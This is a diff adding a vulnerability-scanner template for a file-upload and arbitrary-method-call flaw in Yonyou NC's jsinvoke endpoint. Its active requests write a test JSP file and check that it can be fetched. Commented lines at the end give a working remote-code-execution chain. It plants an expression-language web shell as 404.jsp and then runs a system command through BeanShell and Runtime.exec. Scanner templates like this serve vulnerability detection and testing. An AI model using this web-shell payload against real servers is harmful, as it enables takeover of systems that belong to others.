@@ -1,0 +1,42 @@
+id: yonyou-nc-uapjs-jsinvoke-fileupload
+
+info:
+  name: Yonyou NC uapjs jsinvoke 文件上传漏洞
+  author: SleepingBag945
+  severity: critical
+  description: 用友NC 及 NCC系统存在任意方法调用漏洞，通过uapjs (jsinvoke)利用漏洞可调用危险方法造成攻击。
+  tags: yonyou
+
+http:
+  - raw:
+      - |
+        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig",
+        "parameterTypes":["java.lang.Object","java.lang.String"],
+        "parameters":["{{randstr_2}}","webapps/nc_web/{{randstr_1}}.jsp"]}
+      
+      - |
+        GET /{{randstr_1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200 && contains(body_2,"{{randstr_2}}")
+        condition: and
+
+
+# POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+# Host: {{Hostname}}
+
+# {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/404.jsp"]}
+
+
+# POST /cmdb.jsp?error=bsh.Interpreter HTTP/1.1
+# Host: {{Hostname}}
+
+# cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())
